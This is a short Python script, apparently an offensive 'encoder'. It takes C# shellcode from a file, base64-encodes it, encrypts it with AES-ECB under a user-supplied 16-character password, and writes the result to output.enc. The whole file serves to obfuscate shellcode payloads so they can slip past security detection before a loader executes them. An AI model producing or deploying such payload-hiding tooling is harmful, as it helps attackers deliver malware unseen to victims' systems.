from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode, b64decode
from os import urandom
import sys
import random
import string

from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
import base64

def encrypt(plaintext, key):
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(plaintext) + padder.finalize()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    encodedciphertext = base64.b64encode(ciphertext)
    return encodedciphertext

# Example usage
if(len(sys.argv) != 3):
    print("[-] Usage: python3 encoder.py shellcode.cs 16_character_password")
    sys.exit(1)
shellcode = open(sys.argv[1], "r").readlines()

start = shellcode[1].index("{")
end = shellcode[1].index("}")
finalShellcode = shellcode[1][start+1:end].replace(" ", "")
print("[+] Encoding shellcode to base64")
b64ed = b64encode(finalShellcode.encode('utf-8')).decode('utf-8')
secret_key = sys.argv[2]

print("[+] Encrypting shellcode using AES")
result = encrypt(b64ed.encode('utf-8'), secret_key.encode('utf-8')).decode('utf-8')
#result = b64encode(encrypted_text).decode('utf-8')

with open("output.enc", "w") as output:
    output.write(result)

print("[+] Encrypted Shellcode written on output.enc")
